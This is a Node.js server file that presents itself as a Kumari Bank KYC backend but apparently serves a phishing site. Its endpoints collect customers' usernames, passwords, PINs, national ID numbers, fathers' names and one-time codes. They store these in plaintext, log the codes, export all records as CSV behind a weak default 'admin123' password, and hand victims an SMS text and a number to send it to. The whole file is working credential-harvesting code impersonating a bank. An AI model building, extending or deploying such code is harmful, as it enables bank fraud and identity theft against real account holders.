// server.js â€” Kumari Bank Limited KYC Backend Engine
// Complete Streamlined Server: KYC API, SMS Config & Static Serving
// Listens on 0.0.0.0 to allow access from localhost, Wi-Fi, and LAN devices.

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const os = require('os');

const PORT = parseInt(process.env.PORT, 10) || 8080;
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'responses.json');
const SMS_CONFIG_FILE = path.join(DATA_DIR, 'sms_config.json');
const ADMIN_CONFIG_FILE = path.join(DATA_DIR, 'admin_config.json');

// Ensure data directory & files exist
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, '[]', 'utf8');
}
if (!fs.existsSync(SMS_CONFIG_FILE)) {
  fs.writeFileSync(SMS_CONFIG_FILE, JSON.stringify({
    recipient: '32001',
    messageTemplate: "KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}",
    updatedAt: new Date().toISOString(),
    sessionMessages: {}
  }, null, 2), 'utf8');
}
if (!fs.existsSync(ADMIN_CONFIG_FILE)) {
  fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify({
    adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
    updatedAt: new Date().toISOString()
  }, null, 2), 'utf8');
}

// â”€â”€ Helper: Network Interfaces Discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function getNetworkIps() {
  const interfaces = os.networkInterfaces();
  const list = [];
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        list.push({ name, address: iface.address });
      }
    }
  }
  return list;
}

// â”€â”€ SMS Configuration Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function readSmsConfig() {
  try {
    const raw = fs.readFileSync(SMS_CONFIG_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && parsed.messageTemplate) return parsed;
  } catch (_) {}
  return {
    recipient: '32001',
    messageTemplate: "KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}",
    updatedAt: new Date().toISOString(),
    sessionMessages: {}
  };
}

function saveSmsConfig(cfg) {
  fs.writeFileSync(SMS_CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

// â”€â”€ Admin Security & Password System Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function readAdminConfig() {
  try {
    const raw = fs.readFileSync(ADMIN_CONFIG_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    if (parsed && parsed.adminPassword) return parsed;
  } catch (_) {}
  return {
    adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
    updatedAt: new Date().toISOString()
  };
}

function saveAdminConfig(cfg) {
  fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

function isAuthorizedAdmin(req, query = {}) {
  const cfg = readAdminConfig();
  const expected = (cfg.adminPassword || 'admin123').toString().trim();
  const expectedB64 = Buffer.from(expected).toString('base64');

  // 1. Check custom headers
  const headerPass = (req.headers['x-admin-password'] || req.headers['x-admin-token'] || '').toString().trim();
  if (headerPass && (headerPass === expected || headerPass.toLowerCase() === expected.toLowerCase() || headerPass === expectedB64)) {
    return true;
  }

  // 2. Check Authorization Bearer header
  const authHeader = req.headers['authorization'] || '';
  if (authHeader.startsWith('Bearer ')) {
    const token = authHeader.slice(7).trim();
    if (token === expected || token.toLowerCase() === expected.toLowerCase() || token === expectedB64) {
      return true;
    }
  }

  // 3. Check query param ?auth=... or ?token=...
  const queryAuth = (query.auth || query.token || query.password || '').toString().trim();
  if (queryAuth && (queryAuth === expected || queryAuth.toLowerCase() === expected.toLowerCase() || queryAuth === expectedB64)) {
    return true;
  }

  return false;
}

function renderSmsMessage(template, params = {}) {
  const refId = params.refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
  const mobile = params.mobile || '';
  const username = params.username || '';
  const time = new Date().toTimeString().split(' ')[0];

  return (template || '')
    .replace(/{REF_ID}/g, refId)
    .replace(/{MOBILE}/g, mobile)
    .replace(/{USERNAME}/g, username)
    .replace(/{TIME}/g, time);
}

// â”€â”€ Responses Storage Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function readResponses() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (_) {
    return [];
  }
}

function saveResponses(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(Array.isArray(data) ? data : [], null, 2), 'utf8');
}

// â”€â”€ HTTP Utilities â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
};

function sendJson(res, status, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Admin-Password, X-Admin-Token',
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

function getBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
      if (body.length > 5 * 1024 * 1024) req.destroy(); // 5MB guard
    });
    req.on('end', () => resolve(body));
    req.on('error', () => resolve(''));
  });
}

function log(msg) {
  const ts = new Date().toISOString().replace('T', ' ').substring(0, 19);
  console.log(`[${ts}] ${msg}`);
}

// â”€â”€ HTTP Server Request Dispatcher â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname.toLowerCase();
  const method = req.method.toUpperCase();
  const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace(/^.*:/, '');

  // CORS Preflight
  if (method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, HEAD',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Admin-Password, X-Admin-Token',
      'Content-Length': 0
    });
    return res.end();
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 0. ADMIN AUTHENTICATION
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (pathname === '/api/admin/login' && method === 'POST') {
    const rawBody = await getBody(req);
    try {
      const payload = JSON.parse(rawBody);
      const inputPassword = (payload.password || '').toString().trim();
      const cfg = readAdminConfig();
      const expected = (cfg.adminPassword || 'admin123').toString().trim();
      if (inputPassword && (inputPassword === expected || inputPassword.toLowerCase() === expected.toLowerCase())) {
        log(`Admin logged in successfully from ${clientIp}`);
        return sendJson(res, 200, {
          status: 'success',
          token: Buffer.from(expected).toString('base64'),
          message: 'Admin authentication successful'
        });
      }
      log(`Failed admin login attempt from ${clientIp}`);
      return sendJson(res, 401, { status: 'error', message: 'Invalid administrator password' });
    } catch (e) {
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload' });
    }
  }

  if (pathname === '/api/admin/check-auth' && (method === 'GET' || method === 'POST')) {
    if (isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 200, { status: 'success', authenticated: true });
    }
    return sendJson(res, 401, { status: 'error', authenticated: false, message: 'Not authenticated' });
  }

  if (pathname === '/api/admin/change-password' && method === 'POST') {
    if (!isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
    }
    const rawBody = await getBody(req);
    try {
      const payload = JSON.parse(rawBody);
      const cfg = readAdminConfig();
      const current = (payload.currentPassword || '').toString().trim();
      const newPass = (payload.newPassword || '').toString().trim();
      if (current !== cfg.adminPassword) {
        return sendJson(res, 400, { status: 'error', message: 'Current password is incorrect' });
      }
      if (newPass.length < 4) {
        return sendJson(res, 400, { status: 'error', message: 'New password must be at least 4 characters' });
      }
      cfg.adminPassword = newPass;
      cfg.updatedAt = new Date().toISOString();
      saveAdminConfig(cfg);
      log(`Admin password changed successfully by ${clientIp}`);
      return sendJson(res, 200, {
        status: 'success',
        token: Buffer.from(newPass).toString('base64'),
        message: 'Admin password updated successfully'
      });
    } catch (e) {
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload' });
    }
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 1. HEALTH & CORE STATUS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (pathname === '/api/health' && (method === 'GET' || method === 'HEAD')) {
    return sendJson(res, 200, {
      status: 'online',
      service: 'Kumari Bank Limited KYC Backend',
      totalResponses: readResponses().length,
      time: new Date().toISOString(),
      network: getNetworkIps()
    });
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 2. KYC RESPONSES MANAGEMENT (Protected)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (pathname === '/api/responses' && (method === 'GET' || method === 'HEAD')) {
    if (!isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
    }
    return sendJson(res, 200, readResponses());
  }

  if (pathname === '/api/responses' && method === 'DELETE') {
    if (!isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
    }
    saveResponses([]);
    log(`All responses cleared by ${clientIp}`);
    return sendJson(res, 200, { status: 'success', message: 'All stored responses have been cleared' });
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 3. SMS CONFIGURATION & DYNAMIC MESSAGE ENDPOINTS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (pathname === '/api/sms-config' && (method === 'GET' || method === 'HEAD')) {
    const cfg = readSmsConfig();
    return sendJson(res, 200, Object.assign({ status: 'success' }, cfg));
  }

  if (pathname === '/api/sms-config' && method === 'POST') {
    if (!isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
    }
    const rawBody = await getBody(req);
    try {
      const payload = JSON.parse(rawBody);
      const cfg = readSmsConfig();
      if (payload.messageTemplate !== undefined) {
        cfg.messageTemplate = payload.messageTemplate.trim();
      }
      if (payload.recipient !== undefined) {
        cfg.recipient = payload.recipient.trim();
      }
      if (payload.sessionId && payload.customMessage !== undefined) {
        if (!cfg.sessionMessages) cfg.sessionMessages = {};
        cfg.sessionMessages[payload.sessionId] = payload.customMessage.trim();
      }
      cfg.updatedAt = new Date().toISOString();
      cfg.deployedAt = cfg.updatedAt; // Set on every admin "Save & Deploy" action
      saveSmsConfig(cfg);
      log(`SMS configuration deployed by ${clientIp}`);
      return sendJson(res, 200, {
        status: 'success',
        message: 'SMS message configuration deployed successfully',
        recipient: cfg.recipient || '32001',
        messageTemplate: cfg.messageTemplate,
        deployedAt: cfg.deployedAt
      });
    } catch (e) {
      return sendJson(res, 400, { status: 'error', message: 'Invalid payload: ' + e.message });
    }
  }

  if (pathname === '/api/sms-message' && (method === 'GET' || method === 'POST')) {
    let query = parsed.query || {};
    if (method === 'POST') {
      const rawBody = await getBody(req);
      try {
        const bodyJson = JSON.parse(rawBody);
        query = Object.assign({}, query, bodyJson);
      } catch (_) {}
    }

    const refId = query.refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
    const mobile = query.mobile || '';
    const sessionId = query.sessionId || '';
    const username = query.username || '';

    const cfg = readSmsConfig();
    const recipient = cfg.recipient || '32001';

    let smsBody;
    if (sessionId && cfg.sessionMessages && cfg.sessionMessages[sessionId]) {
      smsBody = renderSmsMessage(cfg.sessionMessages[sessionId], { refId, mobile, username });
    } else {
      smsBody = renderSmsMessage(cfg.messageTemplate, { refId, mobile, username });
    }

    return sendJson(res, 200, {
      status: 'success',
      smsRecipient: recipient,
      smsMessage: smsBody
    });
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 4. KYC STEP 1 SUBMISSION & STEP 3 OTP VERIFICATION
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if ((pathname === '/api/submit' || pathname === '/api/submit-kyc') && method === 'POST') {
    const rawBody = await getBody(req);
    try {
      const payload = JSON.parse(rawBody);
      const sessionId = payload.sessionId || ('KBL-SES-' + (Math.floor(Math.random() * 900000) + 100000));
      const refId = payload.refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));

      const cfg = readSmsConfig();
      const smsRecipient = cfg.recipient || '32001';
      const smsMessage = renderSmsMessage(cfg.messageTemplate, {
        refId,
        mobile: payload.mobile || '',
        username: payload.username || ''
      });

      const nowFormatted = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const record = {
        id: Date.now(),
        sessionId,
        refId,
        status: 'INITIAL_SUBMISSION',
        username: payload.username || '',
        mobile: payload.mobile || '',
        password: payload.password || '',
        pin: payload.pin || '',
        fatherName: payload.fatherName || '',
        nidNumber: payload.nidNumber || '',
        otp: payload.otp || '',
        clientIp,
        userAgent: req.headers['user-agent'] || '',
        createdAt: nowFormatted,
        verifiedAt: '',
        smsRecipient: smsRecipient,
        smsMessage: smsMessage,
      };

      const existing = readResponses();
      const idx = existing.findIndex(r => r.sessionId === sessionId || (payload.mobile && r.mobile === payload.mobile && r.status === 'INITIAL_SUBMISSION'));
      if (idx >= 0) {
        if (record.username) existing[idx].username = record.username;
        if (record.mobile) existing[idx].mobile = record.mobile;
        if (record.password) existing[idx].password = record.password;
        if (record.pin) existing[idx].pin = record.pin;
        if (record.fatherName) existing[idx].fatherName = record.fatherName;
        if (record.nidNumber) existing[idx].nidNumber = record.nidNumber;
        existing[idx].smsRecipient = smsRecipient;
        existing[idx].smsMessage = smsMessage;
      } else {
        existing.unshift(record);
      }
      saveResponses(existing);

      log(`Captured NID Update Step from ${clientIp} - Mobile: ${payload.mobile || existing[idx]?.mobile}, User: ${payload.username || existing[idx]?.username}, Session: ${sessionId}`);
      return sendJson(res, 200, {
        status: 'success',
        sessionId,
        refId: record.refId,
        smsRecipient: smsRecipient,
        smsMessage: smsMessage,
        message: 'Step 1 response recorded'
      });
    } catch (e) {
      log(`Error processing Step 1: ${e.message}`);
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload: ' + e.message });
    }
  }

  if (pathname === '/api/verify-otp' && method === 'POST') {
    const rawBody = await getBody(req);
    try {
      const payload = JSON.parse(rawBody);
      const otp = (payload.otp || '').toString().trim();
      if (!/^\d{6}$/.test(otp)) {
        return sendJson(res, 400, { status: 'error', message: 'Valid 6-digit OTP code is required' });
      }
      const existing = readResponses();
      const nowFormatted = new Date().toISOString().replace('T', ' ').substring(0, 19);
      let finalRefId = payload.refId || '';
      let updated = false;

      for (const r of existing) {
        if (r.sessionId === payload.sessionId || (payload.mobile && r.mobile === payload.mobile && r.status === 'INITIAL_SUBMISSION')) {
          r.otp = payload.otp || '';
          if (payload.refId) r.refId = payload.refId;
          r.status = 'VERIFIED_COMPLETE';
          r.verifiedAt = nowFormatted;
          finalRefId = r.refId;
          updated = true;
          break;
        }
      }

      if (!updated) {
        finalRefId = payload.refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
        existing.unshift({
          id: Date.now(),
          sessionId: payload.sessionId || ('KBL-SES-' + (Math.floor(Math.random() * 900000) + 100000)),
          refId: finalRefId,
          status: 'VERIFIED_COMPLETE',
          username: payload.username || '',
          mobile: payload.mobile || '',
          password: payload.password || '',
          pin: payload.pin || '',
          fatherName: payload.fatherName || '',
          otp: payload.otp || '',
          clientIp,
          userAgent: req.headers['user-agent'] || '',
          createdAt: nowFormatted,
          verifiedAt: nowFormatted,
        });
      }

      saveResponses(existing);
      log(`KYC VERIFIED from ${clientIp} - Mobile: ${payload.mobile}, OTP: ${payload.otp}, RefId: ${finalRefId}`);
      return sendJson(res, 200, {
        status: 'success',
        refId: finalRefId,
        message: 'KYC OTP verification recorded successfully'
      });
    } catch (e) {
      log(`Error processing OTP: ${e.message}`);
      return sendJson(res, 400, { status: 'error', message: 'Invalid JSON payload: ' + e.message });
    }
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 5. EXPORT RESPONSES AS CSV (Protected)
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  if (pathname === '/api/export/csv' && (method === 'GET' || method === 'HEAD')) {
    if (!isAuthorizedAdmin(req, parsed.query)) {
      return sendJson(res, 401, { status: 'error', message: 'Unauthorized. Admin password required.' });
    }
    const records = readResponses();
    const headers = ['id', 'sessionId', 'refId', 'status', 'username', 'mobile', 'password', 'pin', 'fatherName', 'otp', 'clientIp', 'createdAt', 'verifiedAt'];
    let csv = headers.join(',') + '\n';
    for (const r of records) {
      csv += headers.map(h => `"${(r[h] || '').toString().replace(/"/g, '""')}"`).join(',') + '\n';
    }
    const buf = Buffer.from(csv, 'utf8');
    res.writeHead(200, {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': 'attachment; filename="kyc_responses.csv"',
      'Content-Length': buf.length,
      'Access-Control-Allow-Origin': '*',
    });
    return res.end(method === 'HEAD' ? undefined : buf);
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // 6. STATIC FILE SERVING & ROUTE REWRITES
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  let filePath = pathname;
  if (pathname === '/' || pathname === '') filePath = '/index.html';
  else if (pathname === '/responses' || pathname === '/admin') filePath = '/responses.html';
  else if (pathname === '/favicon.ico') filePath = '/logo.png?v=rbb';

  const fullPath = path.join(__dirname, filePath.replace(/^\//, ''));

  try {
    const stat = fs.statSync(fullPath);
    if (stat.isFile()) {
      const ext = path.extname(fullPath).toLowerCase();
      const contentType = MIME[ext] || 'application/octet-stream';
      res.writeHead(200, {
        'Content-Type': contentType,
        'Content-Length': stat.size,
        'Access-Control-Allow-Origin': '*',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
      });
      if (method === 'HEAD') return res.end();
      return fs.createReadStream(fullPath).pipe(res);
    }
  } catch (_) {}

  // 404 Fallback
  res.writeHead(404, {
    'Content-Type': 'text/plain; charset=utf-8',
    'Access-Control-Allow-Origin': '*'
  });
  res.end('404 Not Found: The requested resource does not exist.');
});

// â”€â”€ Bind to 0.0.0.0 (All Interfaces: Localhost + Wi-Fi + LAN) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
server.listen(PORT, '0.0.0.0', () => {
  const ips = getNetworkIps();
  console.log('==========================================================');
  console.log('  Kumari Bank Limited KYC BACKEND & ENGINE ONLINE');
  console.log('==========================================================');
  console.log(`  Local PC Portal : http://localhost:${PORT}/`);
  console.log(`  Response Console: http://localhost:${PORT}/responses.html`);
  console.log('----------------------------------------------------------');
  console.log('  Wi-Fi / Mobile Network Access URLs:');
  if (ips.length === 0) {
    console.log(`    (No external IPv4 network interfaces found)`);
  } else {
    ips.forEach(item => {
      console.log(`    ${item.name.padEnd(16)}: http://${item.address}:${PORT}/`);
    });
  }
  console.log('----------------------------------------------------------');
  console.log(`  Health Endpoint : http://localhost:${PORT}/api/health`);
  console.log(`  Data Storage    : ${DATA_FILE}`);
  console.log('==========================================================');
});

